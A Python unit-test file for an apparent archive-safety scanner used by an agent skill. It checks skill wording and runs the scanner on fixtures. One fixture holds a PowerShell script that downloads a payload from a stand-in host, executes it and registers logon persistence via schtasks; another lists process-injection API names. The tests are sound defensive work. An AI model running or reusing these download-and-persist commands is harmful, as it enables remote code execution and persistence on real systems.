import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


SKILL_ROOT = Path(__file__).resolve().parents[1]
SKILL_TEXT = (SKILL_ROOT / "SKILL.md").read_text(encoding="utf-8")
REFERENCE_TEXT = (
    SKILL_ROOT / "references" / "archive-safety-screening.md"
).read_text(encoding="utf-8")
SCANNER = SKILL_ROOT / "scripts" / "inspect_extracted_project_safety.py"


def run_scanner(project_root: Path) -> dict[str, object]:
    completed = subprocess.run(
        [sys.executable, str(SCANNER), str(project_root), "--compact"],
        check=True,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=20,
    )
    return json.loads(completed.stdout)


class ArchiveSafetyRoutingTests(unittest.TestCase):
    def test_archive_research_routes_through_the_silent_gate(self) -> None:
        research = SKILL_TEXT.split("## 项目研究与讲解", 1)[1].split(
            "## 项目目录治理", 1
        )[0]
        ordered = (
            "scripts/extract_project_archive.ps1",
            "references/archive-safety-screening.md",
            "scripts/inspect_extracted_project_safety.py",
            "只有该方法确认重大隐患时才进入用户输出",
            "否则静默继续原研究",
        )
        positions = [research.index(fragment) for fragment in ordered]
        self.assertEqual(positions, sorted(positions))

    def test_reference_keeps_ordinary_findings_out_of_user_output(self) -> None:
        for fragment in (
            "重大隐患必须形成证据链",
            "默认静默的普通发现",
            "使用硬件 ID、设备授权、遥测或日志上报",
            "不得出现例行安全小节",
            "不能把“可疑”“不透明”改写成“木马”“肉鸡”或“已经中招”",
        ):
            with self.subTest(fragment=fragment):
                self.assertIn(fragment, REFERENCE_TEXT)


class ArchiveSafetyScannerTests(unittest.TestCase):
    def test_clean_source_tree_has_no_high_impact_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "README.md").write_text("Example project", encoding="utf-8")
            (root / "app.py").write_text("print('hello')\n", encoding="utf-8")

            result = run_scanner(root)

            self.assertEqual("no_high_impact_evidence", result["status"])
            self.assertEqual([], result["high_impact_findings"])

    def test_network_authorization_and_device_id_alone_are_not_major(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "stockdb.exe").write_bytes(
                b"MZ\x00MachineGuid\x00XStockSign\\hwid\x00"
                b"https://service.invalid/version\x00X-LogId\x00"
                b"InternetOpenUrlA\x00InternetReadFile\x00"
            )

            result = run_scanner(root)

            self.assertEqual("no_high_impact_evidence", result["status"])
            self.assertEqual(1, result["coverage"]["native_files"])
            self.assertEqual([], result["high_impact_findings"])

    def test_remote_execution_with_persistence_is_high_impact_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "install.ps1").write_text(
                "Invoke-WebRequest https://invalid.example/payload.bin -OutFile $artifact\n"
                "Start-Process $artifact\n"
                "schtasks /create /tn ExampleFixture /tr $artifact /sc onlogon\n",
                encoding="utf-8",
            )

            result = run_scanner(root)

            self.assertEqual("high_impact_evidence", result["status"])
            rule_ids = {
                finding["rule_id"] for finding in result["high_impact_findings"]
            }
            self.assertIn("remote_execution_with_persistence", rule_ids)

    def test_dangerous_words_in_documentation_do_not_trigger(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            docs = root / "docs"
            docs.mkdir()
            (docs / "analysis.py").write_text(
                "VirtualAllocEx WriteProcessMemory CreateRemoteThread\n",
                encoding="utf-8",
            )

            result = run_scanner(root)

            self.assertEqual("no_high_impact_evidence", result["status"])
            self.assertEqual([], result["high_impact_findings"])


if __name__ == "__main__":
    unittest.main()
